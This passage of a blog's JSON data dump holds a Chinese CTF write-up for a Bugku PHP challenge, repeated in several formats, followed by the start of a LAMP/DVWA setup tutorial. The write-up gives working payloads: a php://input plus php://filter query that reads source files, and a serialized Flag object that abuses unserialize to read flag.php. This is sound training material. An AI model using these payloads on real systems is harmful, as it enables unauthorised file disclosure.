\"hello friend!<br>\";  \nif(preg_match(\"/flag/\",$file)){ \n    echo \"ä¸è½ç°å¨å°±ç»ä½ flagå¦\";\n    exit();  \n}else{  \n    include($file);   \n    $password = unserialize($password);  \n    echo $password;  \n}  \n}else{  \necho \"you are not the number of bugku ! \";  \n}  \n\n?>  \n\n<!--  \n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];  \n\nif(isset($user)&&(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \necho \"hello admin!<br>\";  \ninclude($file); //hint.php  \n}else{  \necho \"you are not admin ! \";  \n}  \n -->\n```\n\n结果发现了正则匹配函数preg_match(“/flag/“,$file)，对flag进行了正则匹配。\n\n再来接着看，else代码块中又一次包含了$file,并且对$password进行反序列化。通过对上述hint.php的解读，我们就可以构造password，password为Flag类型，字符串变量file=flag.php。构造的序列化对象payload，password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}\n\n![5.png](https://i.loli.net/2021/08/11/HCewWuc58MpJohf.png)\n\n在这里简单说一下php的反序列化\n\n将原来的某个对象进行序列化之后，从序列化后的结果中就可以知道这个对象的具体类型和值\n\n在这里简单说一下序列化后的几个字母的意思，以password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}为例\n\n* O（大写）：对象class\n* 4：4个字符\n* “Flag”：对象名\n* 1：数量，一个\n* s：string\n* {}里的为参数\n\n反序列化可以理解为序列化的的逆运算\n","slug":"记一道集PHP伪协议PHP反序列化综合运用的CTF","published":1,"updated":"2022-04-29T10:22:34.993Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl2n8fso900095l9jdp7ua4yt","content":"<p>首先拿到题目后，毫无疑问，查看一下源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--  </span><br><span class=\"line\">$user = $_GET[<span class=\"string\">\"txt\"</span>];  </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];  </span><br><span class=\"line\">$pass = $_GET[<span class=\"string\">\"password\"</span>];    </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the bugkuctf\"</span>))&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"hello admin!&lt;br&gt;\"</span>;  </span><br><span class=\"line\"><span class=\"keyword\">include</span>($file); <span class=\"comment\">//hint.php  </span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"you are not admin ! \"</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>解读一下源码的意思：</p>\n<ol>\n<li>get方式传入三个参数：txt，file，password</li>\n<li>file_get_contents()函数的作用是将$user的内容读取出来，在此即为将user读取出来的内容数值与类型完全等于 <code>welcome to the bugkuctf</code>（三个等于号）</li>\n<li>如果满足if条件，则打印输出”hello admin!”。并且将包含的hint.php内容显示出来</li>\n</ol>\n<hr>\n<p>在此，可以运用两个PHP的伪协议</p>\n<ul>\n<li>php://filter 可以进行任意文件的读取。</li>\n</ul>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">有关php://filter的详细了解</a></p>\n<ul>\n<li>php://input 可以读取没有处理过的post数据</li>\n</ul>\n<p>通过对以上代码的分析，我们有了解决思路：</p>\n<ul>\n<li><p>对于file_get_contents($user,’r’)===”welcome to the bugkuctf”，我们可以借用php伪协议php://input，要想使user中的字符串读取出来与三等号后的内容一致，就必须使他的传入参数txt，来post welcome to the bugkuctf</p>\n</li>\n<li><p>再来看include($file); //hint.php 我们可以用php://filter来进行hint.php的base编码，从而可以读取出hint.php的base编码，从而可以读取出hint.php的内容。**</p>\n</li>\n</ul>\n<p>构造payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php?txt&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br></pre></td></tr></table></figure>\n\n<p>利用bp改包</p>\n<p><img src=\"https://i.loli.net/2021/08/11/8Fpr2NfGheadXyj.png\" alt=\"1.png\"></p>\n<p>得到回显</p>\n<p><img src=\"https://i.loli.net/2021/08/11/oVi7pbluDk8LMqR.png\" alt=\"2.png\"></p>\n<p>发现一组base64,再进行base64解码，发现又有一组代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#hint.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;<span class=\"comment\">//flag.php  </span></span><br><span class=\"line\"><span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"string\">\"good\"</span>);</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>再来分析这段代码</p>\n<p>看到flag.php，猜测flag或许就从这段代码中找出。发现了比较关键的一个函数<strong>tostring(),此函数的作用是将Flag类作为字符串执行时会自动执行此函数，并且将变量$file作为文件名输出文件内容。但是，这个时候发现并没有代码显示可以调用这个类，如果没有调用这个类，也就无法执行</strong>tostring()函数。而且，还有一个password参数没有用上，所以考虑，或许还会存在另一段代码。那就接着上一步，把hint.php换成index.php会有什么发现呢？</p>\n<p>果不其然，确实又有了重大发现：</p>\n<p><img src=\"https://i.loli.net/2021/08/11/k41uCXsiTl3ja2o.png\" alt=\"3.png\"></p>\n<p>再次得到回显</p>\n<p><img src=\"https://i.loli.net/2021/08/11/9fxMITFDy8WkvRl.png\" alt=\"4.png\"></p>\n<p>解码后</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$txt = $_GET[<span class=\"string\">\"txt\"</span>];  </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];  </span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the bugkuctf\"</span>))&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"hello friend!&lt;br&gt;\"</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"ä¸è½ç°å¨å°±ç»ä½ flagå¦\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file);   </span><br><span class=\"line\">    $password = unserialize($password);  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $password;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"you are not the number of bugku ! \"</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>  </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!--  </span><br><span class=\"line\">$user = $_GET[<span class=\"string\">\"txt\"</span>];  </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];  </span><br><span class=\"line\">$pass = $_GET[<span class=\"string\">\"password\"</span>];  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the bugkuctf\"</span>))&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"hello admin!&lt;br&gt;\"</span>;  </span><br><span class=\"line\"><span class=\"keyword\">include</span>($file); <span class=\"comment\">//hint.php  </span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"you are not admin ! \"</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"> --&gt;</span><br></pre></td></tr></table></figure>\n\n<p>结果发现了正则匹配函数preg_match(“/flag/“,$file)，对flag进行了正则匹配。</p>\n<p>再来接着看，else代码块中又一次包含了$file,并且对$password进行反序列化。通过对上述hint.php的解读，我们就可以构造password，password为Flag类型，字符串变量file=flag.php。构造的序列化对象payload，password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>\n<p><img src=\"https://i.loli.net/2021/08/11/HCewWuc58MpJohf.png\" alt=\"5.png\"></p>\n<p>在这里简单说一下php的反序列化</p>\n<p>将原来的某个对象进行序列化之后，从序列化后的结果中就可以知道这个对象的具体类型和值</p>\n<p>在这里简单说一下序列化后的几个字母的意思，以password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}为例</p>\n<ul>\n<li>O（大写）：对象class</li>\n<li>4：4个字符</li>\n<li>“Flag”：对象名</li>\n<li>1：数量，一个</li>\n<li>s：string</li>\n<li>{}里的为参数</li>\n</ul>\n<p>反序列化可以理解为序列化的的逆运算</p>\n","site":{"data":{}},"excerpt":"","more":"<p>首先拿到题目后，毫无疑问，查看一下源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--  </span><br><span class=\"line\">$user = $_GET[<span class=\"string\">\"txt\"</span>];  </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];  </span><br><span class=\"line\">$pass = $_GET[<span class=\"string\">\"password\"</span>];    </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the bugkuctf\"</span>))&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"hello admin!&lt;br&gt;\"</span>;  </span><br><span class=\"line\"><span class=\"keyword\">include</span>($file); <span class=\"comment\">//hint.php  </span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"you are not admin ! \"</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>解读一下源码的意思：</p>\n<ol>\n<li>get方式传入三个参数：txt，file，password</li>\n<li>file_get_contents()函数的作用是将$user的内容读取出来，在此即为将user读取出来的内容数值与类型完全等于 <code>welcome to the bugkuctf</code>（三个等于号）</li>\n<li>如果满足if条件，则打印输出”hello admin!”。并且将包含的hint.php内容显示出来</li>\n</ol>\n<hr>\n<p>在此，可以运用两个PHP的伪协议</p>\n<ul>\n<li>php://filter 可以进行任意文件的读取。</li>\n</ul>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">有关php://filter的详细了解</a></p>\n<ul>\n<li>php://input 可以读取没有处理过的post数据</li>\n</ul>\n<p>通过对以上代码的分析，我们有了解决思路：</p>\n<ul>\n<li><p>对于file_get_contents($user,’r’)===”welcome to the bugkuctf”，我们可以借用php伪协议php://input，要想使user中的字符串读取出来与三等号后的内容一致，就必须使他的传入参数txt，来post welcome to the bugkuctf</p>\n</li>\n<li><p>再来看include($file); //hint.php 我们可以用php://filter来进行hint.php的base编码，从而可以读取出hint.php的base编码，从而可以读取出hint.php的内容。**</p>\n</li>\n</ul>\n<p>构造payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php?txt&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br></pre></td></tr></table></figure>\n\n<p>利用bp改包</p>\n<p><img src=\"https://i.loli.net/2021/08/11/8Fpr2NfGheadXyj.png\" alt=\"1.png\"></p>\n<p>得到回显</p>\n<p><img src=\"https://i.loli.net/2021/08/11/oVi7pbluDk8LMqR.png\" alt=\"2.png\"></p>\n<p>发现一组base64,再进行base64解码，发现又有一组代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#hint.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;<span class=\"comment\">//flag.php  </span></span><br><span class=\"line\"><span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"string\">\"good\"</span>);</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>再来分析这段代码</p>\n<p>看到flag.php，猜测flag或许就从这段代码中找出。发现了比较关键的一个函数<strong>tostring(),此函数的作用是将Flag类作为字符串执行时会自动执行此函数，并且将变量$file作为文件名输出文件内容。但是，这个时候发现并没有代码显示可以调用这个类，如果没有调用这个类，也就无法执行</strong>tostring()函数。而且，还有一个password参数没有用上，所以考虑，或许还会存在另一段代码。那就接着上一步，把hint.php换成index.php会有什么发现呢？</p>\n<p>果不其然，确实又有了重大发现：</p>\n<p><img src=\"https://i.loli.net/2021/08/11/k41uCXsiTl3ja2o.png\" alt=\"3.png\"></p>\n<p>再次得到回显</p>\n<p><img src=\"https://i.loli.net/2021/08/11/9fxMITFDy8WkvRl.png\" alt=\"4.png\"></p>\n<p>解码后</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$txt = $_GET[<span class=\"string\">\"txt\"</span>];  </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];  </span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the bugkuctf\"</span>))&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"hello friend!&lt;br&gt;\"</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"ä¸è½ç°å¨å°±ç»ä½ flagå¦\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file);   </span><br><span class=\"line\">    $password = unserialize($password);  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $password;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"you are not the number of bugku ! \"</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>  </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!--  </span><br><span class=\"line\">$user = $_GET[<span class=\"string\">\"txt\"</span>];  </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];  </span><br><span class=\"line\">$pass = $_GET[<span class=\"string\">\"password\"</span>];  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the bugkuctf\"</span>))&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"hello admin!&lt;br&gt;\"</span>;  </span><br><span class=\"line\"><span class=\"keyword\">include</span>($file); <span class=\"comment\">//hint.php  </span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"you are not admin ! \"</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"> --&gt;</span><br></pre></td></tr></table></figure>\n\n<p>结果发现了正则匹配函数preg_match(“/flag/“,$file)，对flag进行了正则匹配。</p>\n<p>再来接着看，else代码块中又一次包含了$file,并且对$password进行反序列化。通过对上述hint.php的解读，我们就可以构造password，password为Flag类型，字符串变量file=flag.php。构造的序列化对象payload，password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>\n<p><img src=\"https://i.loli.net/2021/08/11/HCewWuc58MpJohf.png\" alt=\"5.png\"></p>\n<p>在这里简单说一下php的反序列化</p>\n<p>将原来的某个对象进行序列化之后，从序列化后的结果中就可以知道这个对象的具体类型和值</p>\n<p>在这里简单说一下序列化后的几个字母的意思，以password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}为例</p>\n<ul>\n<li>O（大写）：对象class</li>\n<li>4：4个字符</li>\n<li>“Flag”：对象名</li>\n<li>1：数量，一个</li>\n<li>s：string</li>\n<li>{}里的为参数</li>\n</ul>\n<p>反序列化可以理解为序列化的的逆运算</p>\n"},{"title":"集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之一","date":"2018-11-19T16:00:00.000Z","_content":"\n众所周知，我们在搭建DVWA时，要先搭建好web环境—LAMP（Linux+Apache2+Mysql+PHP5.6）。那么以下就是LAMP具体搭建步骤及问题解决方式。\n\n第一步，安装并配置Mysql。安装顺利的话，直接输入以下三条命令：\n\n``` shell\nsudo apt-get install mysql-server\nsudo apt isntall mysql-client\nsudo apt install libmysqlclient-dev\n```\n\n但总会有不顺利的情况。。。\n\n``` shell\neading package lists... Done\nBuilding dependency tree       \n   Reading state information... Done\n   Some packages could not be installed. This may mean that you have\n   requested an impossible situation or if you are using the unstable\n   distribution that some required packages have not yet been created\n   or been moved out of Incoming.\n   The following information may help to resolve the situation:\n   The following packages have unmet dependencies:\n   mysql-server : Depends: mysql-server-5.1 but it is not going to be instaed\n\n   E: Unable to correct problems, you have held broken packages.\n```\n\n解决办法：\n\n``` shell\nsudo vi /etc/apt/source.list\n```\n\n在此配置文件中上方添加以下内容：\n\n``` shell\ndeb http://mirrors.aliyun.com/ubuntu/ precise main restricted universe multiverse \ndeb http://mirrors.aliyun.com/ubuntu/ precise-security main restricted universe multiver \ndeb http://mirrors.aliyun.com/ubuntu/ precise-updates main restricted universe multiverse \ndeb http://mirrors.aliyun.com/ubuntu/ precise-proposed main restricted universe multiverse \ndeb http://mirrors.aliyun.com/ubuntu/ precise-backports main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise-security main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise-updates main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise-proposed main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise-backports main restricted universe multiverse\n```\n\n更新一下列表（这个过程比较漫长）\n\n``` shell\nsudo apt-get update  && sudo apt-get -y upgrade\n```\n\n再重新执行上述三条命令\n\n------\n\n下面测试一下mysql是否安装成功\n\n``` shell\nsudo netstat -tap | grep mysql\n```\n\n![1.png](https://i.loli.net/2021/08/11/t4zYgRTAmQuf2La.png)\n\n\n进入MySQL服务\n\n``` shell\nmysql -uroot -p你的密码\n```\n\n第二步，安装PHP5.6。\n\n执行以下命令\n\n``` shell\nsudo apt-get install python-software-properties \nsudo add-apt-repository ppa:ondrej/php \nsudo apt-get update \nsudo apt-get -y install php5.6 php5.6-mcrypt php5.6-mbstring php5.6-curl php5.6-cli php5.6-mysql php5.6-gd php5.6-intl php5.6-xsl php5.6-zip\n```\n\n最后查看一下php版本\n\n``` shell\nphp -v\n```\n\n第三步，安装apache2\n\n``` shell\nsudo apt-get install apache2\n```\n\n等待安装完成……\n","source":"_posts/集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之一.md","raw":"---\ntitle: 集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之一\ndate: 2018-11-20 00:00:00\ntags:\n- DVWA搭建\n- lamp搭建\n- sqli-labs\n---\n\n众所周知，我们在搭建DVWA时，要先搭建好web环境—LAMP（Linux+Apache2+Mysql+PHP5.6）。那么以下就是LAMP具体搭建步骤及问题解决方式。\n\n第一步，安装并配置Mysql。安装顺利的话，直接输入以下三条命令：\n\n``` shell\nsudo apt-get install mysql-server\nsudo apt isntall mysql-client\nsudo apt install libmysqlclient-dev\n```\n\n但总会有不顺利的情况。。。\n\n``` shell\neading package lists... Done\nBuilding dependency tree       \n   Reading state information... Done\n   Some packages could not be installed. This may mean that you have\n   requested an impossible situation or if you are using the unstable\n   distribution that some required packages have not yet been created\n   or been moved out of Incoming.\n   The following information may help to resolve the situation:\n   The following packages have unmet dependencies:\n   mysql-server : Depends: mysql-server-5.1 but it is not going to be instaed\n\n   E: Unable to correct problems, you have held broken packages.\n```\n\n解决办法：\n\n``` shell\nsudo vi /etc/apt/source.list\n```\n\n在此配置文件中上方添加以下内容：\n\n``` shell\ndeb http://mirrors.aliyun.com/ubuntu/ precise main restricted universe multiverse \ndeb http://mirrors.aliyun.com/ubuntu/ precise-security main restricted universe multiver \ndeb http://mirrors.aliyun.com/ubuntu/ precise-updates main restricted universe multiverse \ndeb http://mirrors.aliyun.com/ubuntu/ precise-proposed main restricted universe multiverse \ndeb http://mirrors.aliyun.com/ubuntu/ precise-backports main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise-security main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise-updates main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise-proposed main restricted universe multiverse \ndeb-src http://mirrors.aliyun.com/ubuntu/ precise-backports main restricted universe multiverse\n```\n\n更新一下列表（这个过程比较漫长）\n\n``` shell\nsudo apt-get update  && sudo apt-get -y upgrade\n```\n\n再重新执行上述三条命令\n\n------\n\n下面测试一下mysql是否安装成功\n\n``` shell\nsudo netstat -tap | grep mysql\n```\n\n![1.png](https://i.loli.net/2021/08/11/t4zYgRTAmQuf2La.png)\n\n\n进入MySQL服务\n\n``` shell\nmysql -uroot -p你的密码\n```\n\n第二步，安装PHP5.6。\n\n执行以下命令\n\n``` shell\nsudo apt-get install python-software-properties \nsudo add-apt-repository ppa:ondrej/php \nsudo apt-get update \nsudo apt-get -y install php5.6 php5.6-mcrypt php5.6-mbstring php5.6-curl php5.6-cli php5.6-mysql php5.6-gd php5.6-intl php5.6-xsl php5.6-zip\n```\n\n最后查看一下php版本\n\n``` shell\nphp -v\n```\n\n第三步，安装apache2\n\n``` shell\nsudo apt-get install apache2\n```\n\n等待安装完成……\n","slug":"集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之一","published":1,"updated":"2022-04-29T10:22:34.993Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl2n8fso9000b5l9j61ub8nqo","content":"<p>众所周知，我们在搭建DVWA时，要先搭建好web环境—LAMP（Linux+Apache2+Mysql+PHP5.6）。那么以下就是LAMP具体搭建步骤及问题解决方式。</p>\n<p>第一步，安装并配置Mysql。安装顺利的话，直接输入以下三条命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install mysql-server</span><br><span class=\"line\">sudo apt isntall mysql-client</span><br><span class=\"line\">sudo apt install 